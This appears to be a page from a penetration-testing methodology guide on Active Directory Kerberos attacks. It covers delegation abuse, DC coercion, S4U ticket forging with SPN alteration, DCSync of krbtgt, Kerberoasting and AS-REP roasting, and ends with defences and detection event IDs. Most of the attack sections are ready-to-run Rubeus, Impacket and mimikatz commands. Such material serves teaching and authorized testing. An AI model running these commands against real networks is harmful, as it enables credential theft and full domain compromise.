@@ -1,0 +1,360 @@
+---
+title: "Part 2: Exploiting Kerberos Delegation"
+description: "Unconstrained, constrained, and resource-based constrained delegation attacks, plus Kerberoasting and AS-REP Roasting cheatsheet."
+category: Methodology
+subcategory: Active Directory Attack
+order: 2
+tags: ["active-directory", "kerberos", "delegation", "kerberoasting", "pentesting"]
+updated: 2026-04-11
+---
+
+# Part 2: Exploiting Kerberos Delegation
+
+Kerberos delegation allows a service to impersonate a user and access other services on their behalf. It exists so that, for example, a web app can query a SQL database *as the logged-in user*. There are three types of delegation, each with escalating security controls — and each with its own attack surface.
+
+---
+
+## How Delegation Works
+
+```
+User → authenticates to → Service A → acts as user to → Service B
+```
+
+The question is: **how much power does Service A get?**
+
+| Type | Attribute | Scope | Risk |
+|---|---|---|---|
+| **Unconstrained** | `TRUSTED_FOR_DELEGATION` | Any service, anywhere | 🔴 Critical |
+| **Constrained** | `msDS-AllowedToDelegateTo` | Only listed services | 🟠 High |
+| **RBCD** | `msDS-AllowedToActOnBehalfOfOtherIdentity` | Resource defines who can delegate | 🟠 High |
+
+---
+
+## Enumeration
+
+```powershell
+# Unconstrained delegation (excluding DCs, which always have it)
+Get-DomainComputer -Unconstrained | ? {$_.name -notmatch "DC"}
+Get-DomainUser -Unconstrained
+
+# Constrained delegation
+Get-DomainComputer -TrustedToAuth | select name, msds-allowedtodelegateto
+Get-DomainUser -TrustedToAuth | select name, msds-allowedtodelegateto
+
+# RBCD
+Get-DomainComputer | ? {$_.'msds-allowedtoactonbehalfofotheridentity' -ne $null} | select name
+```
+
+```bash
+# Impacket — find delegation
+findDelegation.py domain.local/user:pass -dc-ip DC_IP
+```
+
+---
+
+## Attack: Unconstrained Delegation
+
+**Severity:** 🔴 Critical
+
+When a user authenticates to a service with unconstrained delegation, the service receives and caches the user's **full TGT**. If a Domain Admin visits a file share on an unconstrained delegation server you've compromised, you capture their TGT.
+
+### Passive: Wait for High-Value Connections
+
+```powershell
+# Monitor for incoming TGTs on the compromised server
+Rubeus.exe monitor /interval:5 /nowrap /targetuser:administrator
+```
+
+### Active: Coerce Domain Controller Authentication
+
+Force the DC to authenticate to the unconstrained delegation machine using the Printer Bug or PetitPotam:
+
+```bash
+# Printer Bug — requires a valid domain account
+SpoolSample.exe DC01.domain.local YOURHOST.domain.local
+# or
+printerbug.py domain.local/user:pass@DC01 YOURHOST
+
+# PetitPotam — may work unauthenticated on unpatched DCs
+PetitPotam.py YOURHOST DC01
+```
+
+### Capture and Reuse
+
+```powershell
+# Rubeus captures the DC machine TGT
+Rubeus.exe monitor /interval:5 /nowrap
+
+# Import the ticket
+Rubeus.exe ptt /ticket:<base64_ticket>
+
+# Now you have DC machine account access → DCSync
+mimikatz "lsadump::dcsync /domain:domain.local /user:krbtgt"
+```
+
+---
+
+## Attack: Constrained Delegation (S4U)
+
+**Severity:** 🔴 Critical
+
+Constrained delegation uses two Kerberos extensions:
+
+- **S4U2Self** — Service obtains a ticket to itself on behalf of any user (with protocol transition).
+- **S4U2Proxy** — Service exchanges that ticket for a ticket to the target service listed in `msDS-AllowedToDelegateTo`.
+
+If you compromise the delegating account (have its hash/password/TGT), you can impersonate **any user** (including Domain Admins) to the allowed target services.
+
+### Exploitation with Rubeus
+
+```powershell
+# Impersonate administrator to the target CIFS service
+Rubeus.exe s4u /user:svc_sql /rc4:<ntlm_hash> \
+  /impersonateuser:administrator \
+  /msdsspn:cifs/fileserver.domain.local /ptt
+
+# Or with AES key
+Rubeus.exe s4u /user:svc_sql /aes256:<aes_key> \
+  /impersonateuser:administrator \
+  /msdsspn:cifs/fileserver.domain.local /ptt
+```
+
+### Exploitation with Impacket
+
+```bash
+# Get a service ticket as administrator
+getST.py -spn cifs/fileserver.domain.local \
+  -impersonate administrator \
+  domain.local/svc_sql -hashes :NTHASH
+
+# Use the ticket
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass domain.local/administrator@fileserver.domain.local
+```
+
+### Service Name (SPN) Abuse
+
+The service class in the SPN (the part before `/`) is **not validated** by the DC in many configurations. If delegation is configured for `cifs/host`, you can modify the ticket to target `ldap/host` instead:
+
+```powershell
+# Request for CIFS, then alter to LDAP for DCSync
+Rubeus.exe s4u /user:svc_sql /rc4:<hash> \
+  /impersonateuser:administrator \
+  /msdsspn:cifs/dc01.domain.local \
+  /altservice:ldap /ptt
+
+# Now DCSync is possible
+mimikatz "lsadump::dcsync /domain:domain.local /user:krbtgt"
+```
+
+> 💡 **Key insight:** Constrained delegation to *any* service on a DC can potentially become DCSync through SPN alteration.
+
+---
+
+## Attack: Resource-Based Constrained Delegation (RBCD)
+
+**Severity:** 🔴 Critical
+
+Unlike classic constrained delegation (configured on the front-end service), RBCD is configured on the **target resource**. The attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target computer specifies which accounts can delegate to it.
+
+**Requirements:**
+1. Write access to the target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`
+2. Control of a computer account (create one or use an existing compromise)
+
+### Step 1: Create a Machine Account
+
+By default, any domain user can create up to 10 machine accounts (`MachineAccountQuota`):
+
+```bash
+# Check quota
+crackmapexec ldap dc01 -u user -p pass -M maq
+
+# Create machine account
+addcomputer.py domain.local/user:pass \
+  -computer-name 'FAKEPC$' -computer-pass 'FakePass123!'
+
+# PowerShell alternative
+New-MachineAccount -MachineAccount FAKEPC -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)
+```
+
+### Step 2: Configure RBCD
+
+```bash
+# Set the delegation attribute on target
+rbcd.py domain.local/user:pass -delegate-from 'FAKEPC$' -delegate-to 'TARGET$' -action write -dc-ip DC_IP
+
+# PowerShell alternative
+Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount FAKEPC$
+```
+
+### Step 3: Get a Service Ticket and Access
+
+```bash
+# Request ticket as administrator to TARGET
+getST.py -spn cifs/TARGET.domain.local \
+  -impersonate administrator \
+  domain.local/'FAKEPC$':'FakePass123!'
+
+# Use the ticket
+export KRB5CCNAME=administrator.ccache
+psexec.py -k -no-pass domain.local/administrator@TARGET.domain.local
+smbclient.py -k -no-pass domain.local/administrator@TARGET.domain.local
+wmiexec.py -k -no-pass domain.local/administrator@TARGET.domain.local
+```
+
+### Cleanup
+
+```bash
+rbcd.py domain.local/user:pass -delegate-from 'FAKEPC$' -delegate-to 'TARGET$' -action remove
+```
+
+---
+
+## Attack: Kerberoasting
+
+**Severity:** 🟠 High
+
+Any domain user can request a TGS for any service account that has an SPN set. The TGS is encrypted with the service account's NTLM hash — crackable offline.
+
+### Enumerate Kerberoastable Accounts
+
+```powershell
+Get-DomainUser -SPN | select samaccountname, serviceprincipalname, pwdlastset, memberof
+```
+
+### Extract Hashes
+
+```powershell
+# Rubeus (from Windows)
+Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
+
+# Rubeus — target specific high-value accounts
+Rubeus.exe kerberoast /user:svc_admin /outfile:svc_admin.txt
+
+# AES downgrade — force RC4 for easier cracking
+Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt
+```
+
+```bash
+# Impacket (from Linux)
+GetUserSPNs.py domain.local/user:pass -request -dc-ip DC_IP -outputfile hashes.txt
+```
+
+### Crack
+
+```bash
+# Hashcat (mode 13100 for Kerberos 5 TGS-REP etype 23)
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
+
+# John
+john --format=krb5tgs --wordlist=rockyou.txt hashes.txt
+```
+
+### Targeted Kerberoasting (with GenericWrite)
+
+If you have write access to a user, set an SPN, Kerberoast, then clean up:
+
+```powershell
+# Set SPN
+Set-DomainObject -Identity targetadmin -Set @{serviceprincipalname='http/fake'}
+
+# Kerberoast
+Rubeus.exe kerberoast /user:targetadmin /outfile:admin_hash.txt
+
+# Clean up
+Set-DomainObject -Identity targetadmin -Clear serviceprincipalname
+```
+
+---
+
+## Attack: AS-REP Roasting
+
+**Severity:** 🟠 High
+
+Accounts with `DONT_REQUIRE_PREAUTH` set return an AS-REP encrypted with the user's hash without needing to prove knowledge of the password first.
+
+### Enumerate
+
+```powershell
+Get-DomainUser -PreauthNotRequired | select samaccountname, pwdlastset, memberof
+```
+
+### Extract and Crack
+
+```bash
+# Impacket
+GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -dc-ip DC_IP -outputfile asrep.txt
+
+# Without a user list (uses LDAP query)
+GetNPUsers.py domain.local/user:pass -request -format hashcat
+```
+
+```powershell
+# Rubeus
+Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
+```
+
+```bash
+# Crack (hashcat mode 18200)
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
+```
+
+### Targeted AS-REP Roasting (with GenericWrite)
+
+```powershell
+# Disable pre-auth on the target
+Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
+
+# AS-REP Roast
+Rubeus.exe asreproast /user:targetuser
+
+# Re-enable pre-auth
+Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
+```
+
+---
+
+## Defense & Detection
+
+### Hardening
+
+| Control | What It Prevents |
+|---|---|
+| Eliminate unconstrained delegation | TGT theft from DC coercion |
+| Protected Users group | Disables delegation for member accounts |
+| Set `MachineAccountQuota` to 0 | Blocks RBCD (no new machine accounts) |
+| Use gMSA for service accounts | 120-char random passwords — uncrackable |
+| Enforce AES-only Kerberos | Makes cracking harder (but not impossible) |
+| Disable unnecessary SPNs | Reduces Kerberoast attack surface |
+
+### Detection (Event IDs)
+
+| Event ID | What It Catches |
+|---|---|
+| **4769** | TGS request — watch for RC4 encryption (`0x17`) from many accounts |
+| **4768** | TGT request — AS-REP Roasting detection |
+| **4770** | TGT renewal — abnormal patterns from ticket reuse |
+
+### Honey Accounts
+
+Create fake service accounts with SPNs that have strong passwords. Any Kerberoast attempt against these triggers an alert — real services never request these tickets.
+
+```powershell
+# Create honeypot service account
+New-ADUser -Name "svc_honeypot" -ServicePrincipalNames "MSSQLSvc/honeypot.domain.local"
+# Set strong password, enable monitoring on Event ID 4769 for this SPN
+```
+
+&nbsp;
+
+&nbsp;
+
+---
+
+> **Next up → [Part 3: Exploiting Automated Relays](/docs/methodology/active-directory-attack/03-automated-relays)** — NTLM relay, coercion techniques, and man-in-the-middle attacks.
+
+&nbsp;
+
+## Related Writeups
+
+*Writeups that put these techniques into practice will be linked here.*
